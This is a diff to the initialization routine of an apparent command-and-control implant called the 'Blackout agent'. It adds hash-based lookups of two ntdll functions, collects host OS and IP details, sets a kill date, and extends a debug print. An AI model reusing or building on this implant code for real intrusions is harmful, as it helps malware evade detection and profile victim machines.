@@ -79,6 +79,8 @@ FUNC VOID BlackoutInit() {
     Instance()->Win32.NtCreateThreadEx          = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtCreateThreadEx" ) );
     Instance()->Win32.LdrLoadDll                = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "LdrLoadDll" ) );
     Instance()->Win32.NtQuerySystemInformation  = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtQuerySystemInformation" ) );
+    Instance()->Win32.NtQueryInformationProcess = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtQueryInformationProcess" ) );
+    Instance()->Win32.NtSetInformationVirtualMemory = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtSetInformationVirtualMemory" ) );
     Instance()->Win32.NtAlertResumeThread       = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtAlertResumeThread" ) );
     Instance()->Win32.NtContinue                = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtContinue" ) );
     Instance()->Win32.NtCreateEvent             = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtCreateEvent" ) );
@@ -135,7 +137,6 @@ FUNC VOID BlackoutInit() {
         &Instance()->Config.CompData.IpAddress
     );
 
-
     Instance()->Config.CompData.OsMajorV        = Instance()->Teb->ProcessEnvironmentBlock->OSMajorVersion;
     Instance()->Config.CompData.OsMinorv        = Instance()->Teb->ProcessEnvironmentBlock->OSMajorVersion;
     Instance()->Config.CompData.OsBuildNumber   = Instance()->Teb->ProcessEnvironmentBlock->OSBuildNumber;
@@ -155,7 +156,7 @@ FUNC VOID BlackoutInit() {
     Instance()->Config.Session.KillDate     = CONFIG_KILLDATE;
 
     Instance()->Win32.printf( 
-        "[INFO] Blackout agent initialized @ 0x%p [%d bytes]\n"
+        "[INFO] Blackout agent initialized @ 0x%p [%d bytes] FullLen [%d]\n"
         "[INFO] Blackout Rx Base @ 0x%p [%d bytes]\n"
         "\t=> Process Heap @ 0x%p\n"
         "\t=> ProcessId: %d\n"
@@ -175,6 +176,7 @@ FUNC VOID BlackoutInit() {
         "\t=> Process CmdLine: %ws\n",
         Instance()->Base.Buffer,
         Instance()->Base.Length,
+        Instance()->Base.FullLen,
         Instance()->Base.RxBase,
         Instance()->Base.RxSize,
         Instance()->Config.Session.Heap, 
